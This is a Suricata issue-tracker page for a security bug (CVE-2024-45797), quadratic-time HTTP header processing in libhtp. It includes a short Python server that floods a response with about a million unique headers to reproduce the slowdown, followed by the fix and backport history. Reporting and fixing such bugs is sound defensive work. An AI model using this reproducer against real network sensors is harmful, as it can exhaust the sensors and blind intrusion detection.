

⚲

### Project

### General

### Profile

* [Sign in](/login)
* [Register](/account/register)

* [Home](/)
* [Projects](/projects)
* [Help](https://www.redmine.org/guide)

[Search](/projects/suricata/search?scope=subprojects):

 Suricata[All Projects](/projects?jump=issues)
# Suricata

* [Overview](/projects/suricata)
* [Activity](/projects/suricata/activity)
* [Roadmap](/projects/suricata/roadmap)
* [Issues](/projects/suricata/issues)
* [Wiki](/projects/suricata/wiki)
* [Files](/projects/suricata/files)

### Custom queries

* [8.0.0 Stories](/projects/suricata/issues?query_id=90)
* [Good First Issues](/projects/suricata/issues?query_id=41)
* [OISF community](/projects/suricata/issues?query_id=3)

Actions
Copy link
## Security #7191

closed

### http: quadratic complexity in headers processing/finding

Added by [Philippe Antoine](/users/1820) [5 months](/projects/suricata/activity?from=2024-07-31 "07/31/2024 09:49 AM") ago.
Updated [3 months](/projects/suricata/activity?from=2024-10-16 "10/16/2024 07:50 AM") ago.

Status:ClosedPriority:NormalAssignee:[Philippe Antoine](/users/1820)Target version:[8.0.0-beta1](/versions/163 "04/01/2025")
Affected Versions:Label:CVE:[2024-45797](https://nvd.nist.gov/vuln/detail/CVE-2024-45797)Git IDs:Severity:CRITICALDisclosure Date:

---

**Description**

Found while creating CTF challenge against curl CVE-2023-38039

Script to create traffic was
```
import socket

HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
PORT = 8001  # Port to listen on (non-privileged ports are > 1023)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print(f"Connected by {addr}")
        while True:
            data = conn.recv(1024)
            if not data:
                break
            conn.sendall(b"HTTP/1.1 200 OK\n")
            for i in range(1024*1024):
                conn.sendall(b"Name%d: value%d\n" % (i, i))

```

Most time is spent in `htp_process_response_header_generic`. doing the `htp_table_get`

---

**Files**

[Download all files](/attachments/issues/7191/download "Download all files")

| [curlinf.pcapng](/attachments/3031) (24.1 MB) [curlinf.pcapng](/attachments/download/3031/curlinf.pcapng "Download") |  | Philippe Antoine, 07/31/2024 09:47 AM |  |
| --- | --- | --- | --- |
| [curlinf2.pcapng](/attachments/3032) (2.14 MB) [curlinf2.pcapng](/attachments/download/3032/curlinf2.pcapng "Download") |  | Philippe Antoine, 07/31/2024 09:50 AM |  |

---

**Subtasks**
[1](/issues?parent_id=~7191&set_filter=true&status_id=%2A) (0 open — [1 closed](/issues?parent_id=~7191&set_filter=true&status_id=c))

|  | [Security #7192](/issues/7192): http: quadratic complexity in headers processing/finding (7.0.x backport) | Closed | [Philippe Antoine](/users/1820) |  |  |  | Actions |
| --- | --- | --- | --- | --- | --- | --- | --- |

---

**Related issues**
[1](/issues?issue_id=7246&set_filter=true&status_id=%2A) (0 open — [1 closed](/issues?issue_id=7246&set_filter=true&status_id=c))

|  | Related to Suricata - [Task #7246](/issues/7246): libhtp 0.5.49 | Closed | [Victor Julien](/users/4) |  |  |  | Actions |
| --- | --- | --- | --- | --- | --- | --- | --- |

Related to
Is duplicate of
Has duplicate
Blocks
Blocked by
Precedes
Follows
Copied to
Copied from
Issue #
Delay:  days

Cancel

* [History](/issues/7191?tab=history)
* [Notes](/issues/7191?tab=notes)
* [Property changes](/issues/7191?tab=properties)

ActionsCopy link
[#1](#note-1)
#### Updated by [OISF Ticketbot](/users/7712) [5 months](/projects/suricata/activity?from=2024-07-31 "07/31/2024 09:49 AM") ago

* **Subtask** *#7192* added

ActionsCopy link
[#2](#note-2)
#### Updated by [OISF Ticketbot](/users/7712) [5 months](/projects/suricata/activity?from=2024-07-31 "07/31/2024 09:49 AM") ago

* **Label** deleted (~~*Needs backport to 7.0*~~)

ActionsCopy link
[#3](#note-3)
#### Updated by [Philippe Antoine](/users/1820) [5 months](/projects/suricata/activity?from=2024-07-31 "07/31/2024 09:52 AM") ago

* **File** [curlinf2.pcapng](/attachments/3032) [curlinf2.pcapng](/attachments/download/3032/curlinf2.pcapng "Download") added
* **Label** *Needs backport to 7.0* added

Smaller reproducer

This was not found by quadfuzz, because there needs to be a massive copy/paste but with each getting a small unique mutation...

ActionsCopy link
[#4](#note-4)
#### Updated by [OISF Ticketbot](/users/7712) [5 months](/projects/suricata/activity?from=2024-07-31 "07/31/2024 09:52 AM") ago

* **Label** deleted (~~*Needs backport to 7.0*~~)

ActionsCopy link
[#5](#note-5)
#### Updated by [Philippe Antoine](/users/1820) [5 months](/projects/suricata/activity?from=2024-07-31 "07/31/2024 12:38 PM") ago

* **Status** changed from *New* to *Assigned*

I guess the simple solution is to add a limit to the number of headers

ActionsCopy link
[#6](#note-6)
#### Updated by [Philippe Antoine](/users/1820) [5 months](/projects/suricata/activity?from=2024-08-12 "08/12/2024 12:20 PM") ago

* **Status** changed from *Assigned* to *In Review*

libhtp gitlab MR

ActionsCopy link
[#7](#note-7)
#### Updated by [Victor Julien](/users/4) [4 months](/projects/suricata/activity?from=2024-09-09 "09/09/2024 02:06 PM") ago

* **Related to** *[Task #7246](/issues/7246): libhtp 0.5.49* added

ActionsCopy link
[#8](#note-8)
#### Updated by [Victor Julien](/users/4) [4 months](/projects/suricata/activity?from=2024-09-09 "09/09/2024 02:10 PM") ago

* **Severity** changed from *MODERATE* to *CRITICAL*

CRITICAL is it is a trivial action that the client can initiate.

ActionsCopy link
[#9](#note-9)
#### Updated by [Victor Julien](/users/4) [4 months](/projects/suricata/activity?from=2024-09-13 "09/13/2024 08:14 AM") ago

<https://github.com/OISF/libhtp/security/advisories/GHSA-rqqp-24ch-248f>

ActionsCopy link
[#10](#note-10)
#### Updated by [Juliana Fajardini Reichow](/users/6858) [4 months](/projects/suricata/activity?from=2024-09-16 "09/16/2024 05:26 PM") ago

* **CVE** set to *2024-45797*

<https://github.com/OISF/libhtp/security/advisories/GHSA-rqqp-24ch-248f>

ActionsCopy link
[#11](#note-11)
#### Updated by [Philippe Antoine](/users/1820) [3 months](/projects/suricata/activity?from=2024-10-01 "10/01/2024 08:02 AM") ago

* **Status** changed from *In Review* to *Resolved*

<https://github.com/OISF/libhtp/commit/0d550de551b91d5e57ba23e2b1e2c6430fad6818>

ActionsCopy link
[#12](#note-12)
#### Updated by [Philippe Antoine](/users/1820) [3 months](/projects/suricata/activity?from=2024-10-01 "10/01/2024 09:10 AM") ago

* **Status** changed from *Resolved* to *Closed*

ActionsCopy link
[#13](#note-13)
#### Updated by [Victor Julien](/users/4) [3 months](/projects/suricata/activity?from=2024-10-16 "10/16/2024 07:50 AM") ago

* **Private** changed from *Yes* to *No*

Actions
Copy link

Also available in: [Atom](/issues/7191.atom)
[PDF](/issues/7191.pdf)

Powered by [Redmine](https://www.redmine.org/) © 2006-2024 Jean-Philippe Lang

Loading...

